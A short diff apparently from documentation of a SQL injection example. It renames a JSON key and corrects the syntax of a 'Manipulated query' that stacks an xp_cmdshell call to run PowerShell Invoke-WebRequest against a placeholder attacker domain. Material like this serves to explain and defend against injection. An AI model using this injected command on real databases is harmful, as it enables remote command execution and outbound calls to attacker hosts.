@@ -38,12 +38,12 @@
           },
           {
             "id": null,
-            "table_name": "posts",
+            "title": "posts",
             "content": null
           },
           {
             "id": null,
-            "table_name": "user_information",
+            "title": "user_information",
             "content": null
           }
         ]
@@ -99,5 +99,5 @@
         ```
     2. Manipulated query
         ```sql
-        SELECT * FROM posts WHERE id = 1; exec xp_cmdshell('powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"');
+        SELECT * FROM posts WHERE id = 1; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"';
         ```
